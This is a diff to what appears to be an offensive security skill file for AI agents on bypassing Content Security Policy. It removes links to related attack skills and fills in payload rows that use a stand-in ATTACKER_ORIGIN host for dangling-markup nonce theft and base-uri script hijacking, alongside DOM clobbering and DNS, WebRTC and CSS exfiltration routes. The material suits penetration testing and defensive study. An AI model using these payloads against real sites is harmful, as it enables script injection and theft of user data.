@@ -10,14 +10,6 @@ description: >-
 
 > **AI LOAD INSTRUCTION**: Covers per-directive bypass techniques, nonce/hash abuse, trusted CDN exploitation, data exfiltration despite CSP, and framework-specific bypasses. Base models often suggest `unsafe-inline` bypass without checking if the CSP actually uses it, or miss the critical `base-uri` and `object-src` gaps.
 
-## 0. RELATED ROUTING
-
-- [xss-cross-site-scripting](../xss-cross-site-scripting/SKILL.md) for XSS vectors to deliver after CSP bypass
-- [dangling-markup-injection](../dangling-markup-injection/SKILL.md) when CSP blocks scripts but HTML injection exists — exfiltrate without JS
-- [crlf-injection](../crlf-injection/SKILL.md) when CRLF can inject CSP header or steal nonce via response splitting
-- [waf-bypass-techniques](../waf-bypass-techniques/SKILL.md) when both WAF and CSP must be bypassed
-- [clickjacking](../clickjacking/SKILL.md) when CSP lacks `frame-ancestors` — clickjacking still possible
-
 ---
 
 ## 1. CSP DIRECTIVE REFERENCE MATRIX
@@ -94,7 +86,7 @@ Only scripts with matching nonce attribute execute.
 | ------------------------------ | ------------------------------------------------------------------------------------------------------------------- |
 | Nonce reuse                    | Server uses same nonce across requests or for all users → predictable                                               |
 | Nonce injection via CRLF       | CRLF in response header → inject new CSP header with known nonce, or inject `<script nonce="known">`                |
-| Dangling markup to steal nonce | `<img src=" (unclosed) → page content including nonce leaks as URL parameter            |
+| Dangling markup to steal nonce | `<img src="ATTACKER_ORIGIN/steal?` (unclosed) → page content including nonce leaks as URL parameter |
 | DOM clobbering                 | Overwrite nonce-checking code via DOM clobbering: `<form id="nonce"><input id="nonce" value="attacker-controlled">` |
 | Script gadgets                 | Trusted nonced script uses DOM data to create new script elements — inject that DOM data                            |
 
@@ -104,7 +96,7 @@ Trust propagation: any script created by an already-trusted script is also trust
 
 | Bypass                        | Technique                                                                                                                                                                           |
 | ----------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| `base-uri` injection          | `<base href=" → relative script `src` resolves to attacker domain. Trusted parent script loads `./lib.js` which now points to ` |
+| `base-uri` injection          | `<base href="ATTACKER_ORIGIN/">` → relative script `src` resolves to attacker domain. Trusted parent script loads `./lib.js` which now points to `ATTACKER_ORIGIN/lib.js` |
 | Script gadget in trusted code | Find trusted script that does `document.createElement('script'); s.src = location.hash.slice(1)` → control via URL fragment                                                         |
 | DOM XSS in trusted script     | Trusted script reads `innerHTML` from user-controlled source → injected `<script>` is trusted via `strict-dynamic`                                                                  |
 
@@ -245,7 +237,7 @@ CSP present?
 │   └── Script gadget creating dynamic scripts from DOM data
 │
 └── All script execution blocked?
-    ├── Dangling markup injection → exfil without JS (see ../dangling-markup-injection/SKILL.md)
+    ├── Dangling markup injection → exfil without JS
     ├── DNS prefetch exfiltration
     ├── WebRTC exfiltration
     ├── CSS injection for data extraction
